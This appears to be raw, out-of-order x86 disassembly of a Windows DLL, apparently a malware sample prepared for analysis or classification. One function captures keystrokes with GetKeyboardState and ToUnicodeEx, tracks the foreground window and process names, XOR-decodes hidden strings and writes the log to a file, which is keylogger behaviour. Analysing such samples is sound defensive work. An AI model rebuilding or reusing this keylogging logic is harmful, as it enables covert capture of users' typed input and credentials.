mov [ esi ] 0x32
mov ebx rw-data
mov [ ebp - 0x10 ] edi
lea ebx [ ebx ]
push r--data
call sub_10008aad
inc ecx
mov [ esi + 0x8 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x10 ]
add eax 0x4
add ebx 0x4
mov [ ebp - 0x10 ] eax
cmp eax 0x4c
jb r-xdata
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov ecx [ edi + 0x4 ]
push ebx
push ecx
push edi
call sub_10004fc0
mov ecx [ esi + 0x8 ]
mov edx 0x3ffffffe
sub edx ecx
cmp edx 0x1
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10004310
push ebp
mov ebp esp
push 0xffffffff
push sub_10011a7b
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea ecx [ esi + 0x14 ]
call sub_10008b8d
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov [ ecx ] ecx
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x4 ] ecx
mov [ esi + 0x8 ] 0x0
cmp eax [ esi + 0x4 ]
je r-xdata
or edi 0xffffffff
mov eax [ esi + 0x4 ]
push eax
call sub_10008d40
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edi [ eax ]
push eax
call sub_10008d40
add esp 0x4
mov eax edi
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call sub_10008d40
add esp 0x4
add [ esi + 0x8 ] edi
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
cmp eax ecx
je r-xdata
sub_100043d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1d4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1d0 ] eax
push ebx
push esi
xor esi esi
push edi
mov edi ecx
push 0xc6
lea ecx [ esp + 0x116 ]
xor eax eax
push esi
push ecx
mov [ esp + 0x58 ] edi
mov [ esp + 0x84 ] esi
mov [ esp + 0x74 ] esi
mov [ esp + 0x40 ] esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x5c ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x6c ] esi
mov [ esp + 0x70 ] esi
mov [ esp + 0x8c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x90 ] esi
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] esi
mov [ esp + 0x80 ] esi
mov [ esp + 0x50 ] esi
mov [ esp + 0x94 ] esi
mov [ esp + 0x98 ] esi
mov [ esp + 0x78 ] esi
mov [ esp + 0x7c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x11c ] ax
call sub_1000a740
movzx edx [ edi ]
mov edi [ VirtualAlloc@IAT ]
add esp 0xc
push 0x4
push 0x3000
add edx 0x14
push edx
push esi
call edi
mov [ esp + 0x2c ] eax
cmp eax esi
jne r-xdata
push 0x4
push 0x3000
push 0x104
push esi
call edi
mov [ esp + 0x30 ] eax
cmp eax esi
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1d0 ]
xor ecx esp
call sub_10008bf6
mov esp ebp
pop ebp
retn
push 0x4
push 0x3000
push 0x118
push esi
call edi
mov [ esp + 0x38 ] eax
cmp eax esi
je r-xdata
push 0x1
push 0x230
call sub_100091bb
push 0x104
mov [ esp + 0x24 ] eax
call sub_10009388
push 0x104
mov [ esp + 0x58 ] eax
call sub_10009388
mov [ esp + 0x6c ] eax
add esp 0x10
mov ecx 0x32
lea edi [ esp + 0x110 ]
lea eax [ esp + 0xdc ]
mov [ esp + 0xdc ] 0x947f382e
mov [ esp + 0xe0 ] 0x822d203a
mov [ esp + 0xe4 ] 0x19181237
mov [ esp + 0xe8 ] 0x434955e7
mov [ esp + 0xec ] 0x387743f8
mov [ esp + 0xf0 ] 0x20619424
mov [ esp + 0xf4 ] 0x12208263
mov [ esp + 0xf8 ] 0x55f81957
mov [ esp + 0xfc ] 0x43f0434f
mov [ esp + 0x100 ] 0x947b382f
mov [ esp + 0x104 ] 0x82362039
mov [ esp + 0x108 ] 0x19061226
mov [ esp + 0x10c ] 0x5594
mov [ esp + 0x90 ] 0x947f382e
mov [ esp + 0x94 ] 0x822d203a
mov [ esp + 0x98 ] 0x19181237
mov [ esp + 0x9c ] 0x434f55f7
mov [ esp + 0xa0 ] 0x387d43ee
mov [ esp + 0xa4 ] 0x2068946b
mov [ esp + 0xa8 ] 0x12268231
mov [ esp + 0xac ] 0x55aa195c
mov [ esp + 0xb0 ] 0x4320
mov [ esp + 0xb4 ] 0x947f382e
mov [ esp + 0xb8 ] 0x822d203a
mov [ esp + 0xbc ] 0x19181237
mov [ esp + 0xc0 ] 0x434f55f7
mov [ esp + 0xc4 ] 0x387d43ee
mov [ esp + 0xc8 ] 0x2068946b
mov [ esp + 0xcc ] 0x12318224
mov [ esp + 0xd0 ] 0x55f1195d
mov [ esp + 0xd4 ] 0x43bc434e
mov [ esp + 0xd8 ] 0x3812
call sub_10004d70
mov eax edi
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
cmp dx si
jne r-xdata
mov edx [ esp + 0x30 ]
sub eax ecx
sar eax 0x1
add eax eax
push eax
lea ecx [ esp + 0x114 ]
push ecx
push edx
call sub_1000a7c0
add esp 0xc
mov ecx 0x22
lea edi [ esp + 0x110 ]
lea eax [ esp + 0x90 ]
call sub_10004d70
mov eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ esp + 0x2c ]
sar eax 0x1
add eax eax
push eax
lea ecx [ esp + 0x114 ]
push ecx
push edx
call sub_1000a7c0
add esp 0xc
mov ecx 0x26
lea edi [ esp + 0x110 ]
lea eax [ esp + 0xb4 ]
call sub_10004d70
mov eax edi
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ esp + 0x38 ]
sar eax 0x1
add eax eax
push eax
lea ecx [ esp + 0x114 ]
push ecx
push edx
call sub_1000a7c0
add esp 0xc
push esi
push 0x80
push 0x3
push esi
push 0x3
push 0x40000000
push rw-data
call [ CreateFileW@IAT ]
mov [ esp + 0x20 ] eax
cmp eax esi
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esp + 0x7c ] eax
mov ecx [ esp + 0x1dc ]
pop edi
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_10008bf6
mov esp ebp
pop ebp
retn
call [ GetForegroundWindow@IAT ]
mov ebx eax
mov [ esp + 0x40 ] ebx
test ebx ebx
jne r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
cmp ebx [ esp + 0x74 ]
je r-xdata
push 0x12c
call [ Sleep@IAT ]
jmp r-xdata
cmp [ esp + 0x80 ] 0x64
jae r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
lea eax [ esp + 0x78 ]
push eax
push ebx
call [ GetWindowThreadProcessId@IAT ]
mov edi eax
mov [ esp + 0x3c ] 0x0
cmp edi [ esp + 0x14 ]
je r-xdata
push 0x14
call [ Sleep@IAT ]
cmp [ esp + 0x54 ] 0x0
je r-xdata
call [ GetTickCount@IAT ]
mov [ esp + 0x28 ] eax
sub eax [ esp + 0x84 ]
cmp eax 0x1f4
jbe r-xdata
mov edx [ esp + 0x48 ]
push edx
call [ GetKeyboardState@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
lea edx [ esp + 0x88 ]
push edx
call [ GetCursorPos@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x5c ]
xor edi edi
sub edx eax
lea esp [ esp ]
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ esp + 0x7c ]
push 0x1
push ecx
push edi
call [ AttachThreadInput@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x7c ]
mov edx [ esp + 0x14 ]
push 0x0
push ecx
push edx
call [ AttachThreadInput@IAT ]
mov eax [ esp + 0x5c ]
push 0x100
push 0x0
push eax
call sub_1000a740
add esp 0xc
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x8c ]
mov ebx [ esp + 0x88 ]
mov ecx edx
sub ecx [ esp + 0x70 ]
mov eax ebx
sub eax [ esp + 0x6c ]
imul ecx ecx
imul eax eax
add eax ecx
mov [ esp + 0x80 ] eax
je r-xdata
inc edi
inc eax
cmp edi 0x100
jb r-xdata
mov [ edx + eax ] cl
test cl cl
js r-xdata
push 0x64
call [ Sleep@IAT ]
cmp [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] edi
mov [ esp + 0x74 ] ebx
mov [ esp + 0x54 ] 0x1
je r-xdata
mov esi [ esp + 0x18 ]
push edx
push ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] edx
call [ WindowFromPoint@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov cl [ eax ]
cmp cl [ edx + eax ]
je r-xdata
jmp r-xdata
mov [ esp + 0x28 ] 0x0
cmp edi 0x8
je r-xdata
mov eax [ esp + 0x78 ]
cmp eax [ esp + 0x68 ]
je r-xdata
cmp [ esp + 0x1c ] 0x0
jne r-xdata
cmp ebx [ esp + 0x44 ]
jne r-xdata
cmp edi 0x1b
je r-xdata
cmp edi 0xb
je r-xdata
push eax
push 0x0
push 0x410
mov [ esp + 0x74 ] eax
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
push 0x0
push 0x0
push 0x230
push esi
add eax 0x10
push eax
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push 0x0
lea edx [ esp + 0x28 ]
push edx
push eax
mov eax [ esp + 0x2c ]
push esi
push eax
call [ WriteFile@IAT ]
mov [ esp + 0x10 ] 0x0
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x230
push esi
add edx 0x18
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push eax
push esi
push edx
call [ WriteFile@IAT ]
mov [ esp + 0x1c ] 0x1
push 0x0
push ebx
call [ GetWindowThreadProcessId@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx eax
sub ecx [ esp + 0x60 ]
cmp ecx 0x1f4
jb r-xdata
cmp [ esp + 0x10 ] 0x0
jmp r-xdata
cmp edi 0x20
jbe r-xdata
cmp edi 0xd
jbe r-xdata
mov eax [ esp + 0x30 ]
push 0x104
add eax 0x30
push eax
push 0x0
push edi
mov [ esp + 0x38 ] eax
call [ GetModuleBaseNameW@IAT ]
test eax eax
je r-xdata
cmp ebx [ esp + 0x40 ]
je r-xdata
mov [ esp + 0x54 ] 0x0
jmp r-xdata
mov ebx [ esp + 0x40 ]
mov [ esp + 0x60 ] eax
cmp ebx [ esp + 0x44 ]
je r-xdata
je r-xdata
cmp edi 0x2a
jbe r-xdata
cmp edi 0x2a
jb r-xdata
push edi
call [ CloseHandle@IAT ]
mov esi [ esp + 0x28 ]
call sub_10004f00
mov esi [ esp + 0x4c ]
mov ebx eax
call sub_10004f30
cmp al 0x1
jne r-xdata
mov esi [ esp + 0x38 ]
lea edx [ esp + 0x50 ]
push edx
push 0xa
push 0x3
add esi 0x24
push esi
push 0x104
push 0xd
push ebx
call [ SendMessageTimeoutW@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x44 ] ebx
mov esi [ esp + 0x18 ]
cmp [ esp + 0x10 ] 0x5
jbe r-xdata
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push edx
call [ GetKeyboardLayout@IAT ]
mov ebx eax
push ebx
push 0x0
push edi
call [ MapVirtualKeyExW@IAT ]
test eax eax
je r-xdata
cmp edi 0x30
jb r-xdata
mov ecx [ esp + 0x28 ]
push 0x104
push ecx
push 0x0
push edi
call [ GetModuleFileNameExW@IAT ]
mov esi [ esp + 0x18 ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x3c ] 0x1
mov edx [ esp + 0x50 ]
test edx edx
je r-xdata
cmp edi 0x2
jbe r-xdata
cmp [ esp + 0x3c ] 0x1
jne r-xdata
mov eax [ esp + 0x2c ]
push 0x0
push 0x0
push 0x230
push esi
add ebx 0x10
push ebx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push eax
push esi
push edx
call [ WriteFile@IAT ]
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x230
push esi
add edx 0x18
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push eax
push esi
push edx
call [ WriteFile@IAT ]
mov [ esp + 0x1c ] 0x1
mov edx [ esp + 0x48 ]
push ebx
push 0x0
push 0x2
lea ecx [ esp + 0x64 ]
push ecx
push edx
push eax
push edi
call [ ToUnicodeEx@IAT ]
cmp eax 0x1
jne r-xdata
mov eax esi
lea edi [ eax + 0x2 ]
jmp r-xdata
call [ GetTickCount@IAT ]
mov [ esp + 0x84 ] eax
mov ecx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x28 ]
push eax
push 0x6
push r--data
push ecx
mov [ esp + 0x50 ] 0x0
call [ WriteFile@IAT ]
mov eax [ esp + 0x58 ]
mov ebx [ esp + 0x10 ]
cmp ax 0x1f
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
cmp [ esp + 0x58 ] 0x8
jne r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x4c ]
mov [ ecx + ebx * 2 + 0x20 ] ax
movzx eax [ edx ]
inc ebx
mov [ esp + 0x10 ] ebx
cmp ebx eax
jne r-xdata
sub eax edi
sar eax 0x1
cmp edx eax
jne r-xdata
cmp [ esp + 0x28 ] 0x0
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x4c ]
mov ecx 0x5d
mov [ edx + ebx * 2 + 0x20 ] cx
movzx ecx [ eax ]
inc ebx
mov [ esp + 0x10 ] ebx
cmp ebx ecx
je r-xdata
mov [ esp + 0x28 ] 0x1
mov ecx [ esp + 0x38 ]
xor eax eax
mov [ ecx + edx * 2 + 0x26 ] ax
cmp ebx [ esp + 0x40 ]
jne r-xdata
cmp [ esp + 0x1c ] 0x0
jne r-xdata
cmp [ esp + 0x1c ] 0x0
mov esi [ esp + 0x18 ]
jne r-xdata
call sub_10004f00
cmp eax [ esp + 0x64 ]
je r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x38 ]
push 0x0
push 0x0
push 0x230
push esi
add eax 0x12
push eax
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push 0x0
lea edx [ esp + 0x28 ]
push edx
push eax
mov eax [ esp + 0x2c ]
push esi
push eax
call [ WriteFile@IAT ]
jmp r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x230
push esi
add edx 0x18
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esp + 0x20 ]
push 0x0
lea ecx [ esp + 0x28 ]
push ecx
push eax
push esi
push edx
call [ WriteFile@IAT ]
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x64 ] eax
sub_10004d70
push ebx
mov ebx eax
mov eax 0x38e38e39
mul ecx
shr edx 0x1
lea eax [ edx + edx * 8 ]
mov edx ecx
sub edx eax
mov al [ edx + rw-data ]
xor al [ ebx + ecx ]
mov [ edi + ecx ] al
test ecx ecx
je r-xdata
pop ebx
retn
sub ebx edi
push esi
dec ecx
mov eax 0x38e38e39
mul ecx
shr edx 0x1
lea edx [ edx + edx * 8 ]
mov eax ecx
sub eax edx
mov dl [ eax + rw-data ]
lea esi [ ecx + edi ]
xor dl [ ebx + esi ]
mov [ esi ] dl
test ecx ecx
jne r-xdata
pop esi
sub_10004dc0
push ebp
mov ebp esp
push ecx
movzx eax [ edx ]
push esi
xor ecx ecx
xor esi esi
test ax ax
je r-xdata
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
movzx eax ax
ror esi 0xd
inc ecx
add esi eax
movzx eax [ edx + ecx * 2 ]
test ax ax
jne r-xdata
push ebx
lea ecx [ edi + 0x14 ]
call sub_10008ba4
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov [ edi + 0x10 ] ecx
cmp ecx eax
je r-xdata
xor al al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x4 ]
mov esi [ edx ]
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push esi
call sub_10004fc0
mov ecx [ edi + 0x8 ]
mov edx 0x3ffffffe
sub edx ecx
cmp edx 0x1
jae r-xdata
mov ecx [ edi + 0x10 ]
cmp [ ecx + 0x8 ] esi
je r-xdata
inc ecx
mov [ edi + 0x8 ] ecx
mov [ esi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
lea ecx [ edi + 0x14 ]
call sub_10008bad
pop ebx
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
push r--data
call sub_10008aad
lea ecx [ edi + 0x14 ]
call sub_10008bad
pop ebx
xor al al
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov [ edi + 0x10 ] eax
cmp eax [ edi + 0x4 ]
jne r-xdata
sub_10004e70
movzx eax [ edx ]
push ebx
push esi
xor ecx ecx
xor esi esi
test ax ax
je r-xdata
lea ecx [ edi + 0x14 ]
call sub_10008ba4
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov edi edi
pop esi
xor al al
pop ebx
retn
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov [ edi + 0x10 ] ecx
cmp ecx eax
je r-xdata
movzx eax ax
ror esi 0xd
inc ecx
add esi eax
movzx eax [ edx + ecx * 2 ]
test ax ax
jne r-xdata
lea ecx [ edi + 0x14 ]
call sub_10008bad
lea esp [ esp ]
mov eax ecx
cmp eax [ edi + 0x4 ]
je r-xdata
mov eax [ ecx ]
mov [ edi + 0x10 ] eax
cmp eax [ edi + 0x4 ]
jne r-xdata
lea ecx [ edi + 0x14 ]
call sub_10008bad
pop esi
mov al 0x1
pop ebx
retn
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ edx ] ecx
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
push eax
mov [ edx + 0x4 ] ecx
call sub_10008d40
add esp 0x4
dec [ edi + 0x8 ]
mov ecx [ edi + 0x10 ]
cmp [ ecx + 0x8 ] esi
je r-xdata
sub_10004f00
movzx ecx [ esi ]
xor edx edx
xor eax eax
test cx cx
je r-xdata
retn
lea esp [ esp ]
movzx ecx cx
ror eax 0xd
inc edx
add eax ecx
movzx ecx [ esi + edx * 2 ]
test cx cx
jne r-xdata
sub_10004f30
push edi
lea ecx [ esi + 0x14 ]
call sub_10008ba4
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
cmp ecx eax
je r-xdata
lea ecx [ esi + 0x14 ]
call sub_10008bad
xor al al
pop edi
retn
mov eax [ esi + 0x10 ]
cmp [ eax + 0x8 ] ebx
je r-xdata
lea ecx [ esi + 0x14 ]
call sub_10008bad
mov al 0x1
pop edi
retn
mov edx [ eax ]
mov eax edx
mov [ esi + 0x10 ] edx
cmp eax [ esi + 0x4 ]
jne r-xdata
sub_10004f80
mov ecx [ esi ]
mov eax [ ecx ]
mov [ ecx ] ecx
mov ecx [ esi ]
mov [ ecx + 0x4 ] ecx
mov [ esi + 0x4 ] 0x0
cmp eax [ esi ]
je r-xdata
mov eax [ esi ]
push eax
call sub_10008d40
pop ecx
retn
push edi
mov edi [ eax ]
push eax
call sub_10008d40
add esp 0x4
mov eax edi
cmp edi [ esi ]
jne r-xdata
pop edi
sub_10004fc0
push ebp
mov ebp esp
sub esp 0xc
push 0xc
call sub_10008d9c
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10008c8d
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10009ef4
int3
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] ecx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
mov [ ecx ] edx
sub_10005020
push ebp
mov ebp esp
push 0xffffffff
push sub_10011d10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_10005970
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100050a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10011d99
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ edi + 0x4 ] r--data
mov [ edi ] r--data
mov [ edi + 0x4 ] r--data
lea esi [ edi + 0x10 ]
xor ebx ebx
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_10008c8d
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_10009ef4
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
lea esi [ edi + 0x28 ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10008c8d
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
push 0x24
mov [ ebp - 0x4 ] 0x1
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] bl
jmp r-xdata
xor esi esi
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
push 0x1b
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10002ec0
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x40 ] ebx
jmp r-xdata
mov [ edi + 0x8 ] eax
mov edx 0x1301
mov [ eax ] dx
mov ecx [ edi + 0x8 ]
add ecx 0x4
mov esi 0xa
mov eax r--data
call sub_10002000
mov eax [ edi + 0x8 ]
mov [ eax + 0x20 ] bl
mov ecx [ edi + 0x8 ]
push 0x44
mov [ ecx + 0x21 ] 0x1
call sub_10008d9c
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
lea eax [ edi + 0x4 ]
mov [ edi + 0xc ] esi
mov [ esi + 0x40 ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10005260
push ebp
mov ebp esp
push 0xffffffff
push sub_10011d46
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx + 0x2 ]
cmp eax 0x11
ja r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_100053ac ]
jmp [ eax * 4 + jump_table_10005398 ]
push ebx
call sub_10008d40
add esp 0x4
push eax
call sub_10009181
add esp 0x4
mov ecx [ esi + 0xc ]
push 0x0
push 0x0
push ecx
push sub_10005020
push 0x0
push 0x0
call [ CreateThread@IAT ]
jmp r-xdata
push 0x1c
call sub_10008d9c
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
mov esi [ ebx + 0xc ]
push 0x1c
call sub_10008d9c
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x1
test edi edi
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax r--data
call sub_10003260
jmp r-xdata
xor edi edi
mov eax [ ebx + 0x8 ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov ecx edi
mov [ edi ] 0x0
call sub_10002000
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
push edx
lea eax [ esi + 0x10 ]
call sub_10005630
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp + 0x8 ] edi
call sub_100055d0
mov esi ebx
call sub_10001cb0
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
add eax 0x10
call sub_10005630
jmp r-xdata
sub_100053c0
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x38 ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x28 ]
lea eax [ ebp - 0xc ]
mov ecx esi
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_10005470
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x1c ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0xc ]
lea eax [ ebp - 0xc ]
mov ecx esi
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
